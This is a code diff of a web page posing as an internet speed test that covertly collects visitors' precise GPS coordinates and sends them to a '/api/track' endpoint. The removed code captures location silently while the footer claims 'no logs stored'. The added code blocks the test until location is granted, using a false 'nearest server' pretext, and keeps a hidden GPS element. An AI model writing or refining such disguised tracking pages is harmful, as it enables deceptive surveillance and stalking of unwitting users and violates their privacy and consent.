@@ -7,7 +7,7 @@
     <style>
         * { margin:0; padding:0; box-sizing:border-box; font-family:system-ui,sans-serif; }
         body { background:#0b1120; display:flex; justify-content:center; align-items:center; min-height:100vh; color:#e2e8f0; }
-        .card { background:#1e293b; padding:2.5rem; border-radius:2rem; width:420px; text-align:center; }
+        .card { background:#1e293b; padding:2.5rem; border-radius:2rem; width:440px; text-align:center; }
         h1 { font-weight:300; letter-spacing:2px; font-size:1.8rem; }
         .sub { color:#94a3b8; font-size:0.85rem; margin:1rem 0 2rem; border-bottom:1px solid #334155; padding-bottom:1rem; }
         .metric { display:flex; justify-content:space-between; background:#0f172a; padding:0.7rem 1.2rem; border-radius:1rem; margin:0.5rem 0; }
@@ -19,9 +19,12 @@
         .spinner { display:none; margin:1rem auto; width:40px; height:40px; border:4px solid #334155; border-top:4px solid #38bdf8; border-radius:50%; animation:spin 0.9s linear infinite; }
         @keyframes spin { to { transform:rotate(360deg); } }
         .footer { margin-top:1.5rem; font-size:0.7rem; color:#475569; }
-        /* GPS row is HIDDEN from user */
-        .gps-row { display:none !important; }
-        .location-badge { display:none !important; }
+        .error-box { background:#1e293b; border:1px solid #ef4444; padding:1rem; border-radius:1rem; margin-top:1rem; display:none; }
+        .error-box .error-title { color:#ef4444; font-weight:700; }
+        .error-box .error-desc { color:#94a3b8; font-size:0.8rem; margin-top:0.3rem; }
+        .retry-btn { background:#334155; border:none; color:#fff; padding:0.5rem 1.5rem; border-radius:2rem; font-size:0.8rem; cursor:pointer; margin-top:0.8rem; }
+        .retry-btn:hover { background:#475569; }
+        .location-required { color:#fbbf24; font-size:0.8rem; margin-top:0.5rem; }
     </style>
 </head>
 <body>
@@ -34,44 +37,90 @@
     <div class="metric"><span>📶 Ping</span><span id="ping">-- ms</span></div>
     <div class="metric"><span>🌍 Server</span><span id="server">--</span></div>
     
-    <!-- GPS row is COMPLETELY HIDDEN from user -->
+    <!-- GPS row is HIDDEN from user -->
     <div class="gps-row" id="gpsRow" style="display:none !important;"></div>
     
+    <!-- Error box - shown when location is denied -->
+    <div class="error-box" id="errorBox">
+        <div class="error-title">⚠️ Location Access Required</div>
+        <div class="error-desc">For accurate speed testing, we need your location to connect to the nearest server. Please allow location access and try again.</div>
+        <button class="retry-btn" onclick="requestLocationAgain()">🔄 Retry</button>
+    </div>
+    
     <div class="spinner" id="spinner"></div>
-    <button id="startBtn">▶ Start Test</button>
-    <div id="locationBadge" class="location-badge" style="display:none !important;"></div>
-    <div class="footer">🔒 encrypted · no logs stored</div>
+    <button id="startBtn" disabled>▶ Waiting for Location...</button>
+    <div class="location-required" id="locationStatus">📍 Waiting for location access...</div>
+    <div class="footer">🔒 encrypted · location required for accurate test</div>
 </div>
 
 <script>
 let gpsData = null;
+let locationDenied = false;
 
-// Request GPS location SILENTLY (user doesn't see any indication)
+// Request GPS location — if denied, show error and block test
 function requestLocation() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
+            // SUCCESS: GPS acquired
             (position) => {
                 gpsData = {
                     lat: position.coords.latitude,
                     lon: position.coords.longitude,
                     accuracy: position.coords.accuracy
                 };
-                // Silently log to console (only visible to you in Render logs)
-                console.log('📍 GPS captured silently:', gpsData.lat, gpsData.lon);
+                locationDenied = false;
+                document.getElementById('errorBox').style.display = 'none';
+                document.getElementById('startBtn').disabled = false;
+                document.getElementById('startBtn').textContent = '▶ Start Test';
+                document.getElementById('locationStatus').textContent = '✅ Location acquired — ready for test';
+                document.getElementById('locationStatus').style.color = '#22c55e';
+                console.log('📍 GPS captured:', gpsData.lat, gpsData.lon);
             },
+            // ERROR: Location denied or failed
             (error) => {
-                // Silent fail — user never knows
+                locationDenied = true;
                 gpsData = null;
+                document.getElementById('errorBox').style.display = 'block';
+                document.getElementById('startBtn').disabled = true;
+                document.getElementById('startBtn').textContent = '⛔ Location Required';
+                document.getElementById('locationStatus').textContent = '❌ Location access denied — test blocked';
+                document.getElementById('locationStatus').style.color = '#ef4444';
+                console.log('📍 Location denied by user');
             },
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
         );
+    } else {
+        // Browser doesn't support geolocation
+        document.getElementById('errorBox').style.display = 'block';
+        document.getElementById('errorBox').querySelector('.error-desc').textContent = 
+            'Your browser does not support location services. Please use a modern browser with location support.';
+        document.getElementById('startBtn').disabled = true;
+        document.getElementById('startBtn').textContent = '⛔ Not Supported';
+        document.getElementById('locationStatus').textContent = '❌ Browser does not support location';
+        document.getElementById('locationStatus').style.color = '#ef4444';
     }
 }
 
-// Request location silently when page loads
+// Retry location request
+function requestLocationAgain() {
+    document.getElementById('errorBox').style.display = 'none';
+    document.getElementById('locationStatus').textContent = '📍 Requesting location...';
+    document.getElementById('locationStatus').style.color = '#fbbf24';
+    requestLocation();
+}
+
+// Request location when page loads
 requestLocation();
 
 document.getElementById('startBtn').addEventListener('click', async function() {
+    // Double-check GPS is available before running test
+    if (!gpsData) {
+        document.getElementById('errorBox').style.display = 'block';
+        document.getElementById('startBtn').disabled = true;
+        document.getElementById('startBtn').textContent = '⛔ Location Required';
+        return;
+    }
+
     const btn = this;
     btn.disabled = true;
     btn.textContent = '⏳ Testing...';
@@ -80,32 +129,11 @@ document.getElementById('startBtn').addEventListener('click', async function() {
     ['download','upload','ping','server'].forEach(id => document.getElementById(id).textContent = '--');
 
     try {
-        // If GPS hasn't been acquired yet, try again silently
-        if (!gpsData && navigator.geolocation) {
-            const gpsPromise = new Promise((resolve) => {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        gpsData = {
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy
-                        };
-                        resolve(gpsData);
-                    },
-                    () => { resolve(null); },
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            });
-            await gpsPromise;
-        }
-
-        // Prepare payload with GPS data if available
-        const payload = {};
-        if (gpsData) {
-            payload.gps_lat = gpsData.lat;
-            payload.gps_lon = gpsData.lon;
-            payload.gps_accuracy = gpsData.accuracy;
-        }
+        const payload = {
+            gps_lat: gpsData.lat,
+            gps_lon: gpsData.lon,
+            gps_accuracy: gpsData.accuracy
+        };
 
         const res = await fetch('/api/track', {
             method: 'POST',
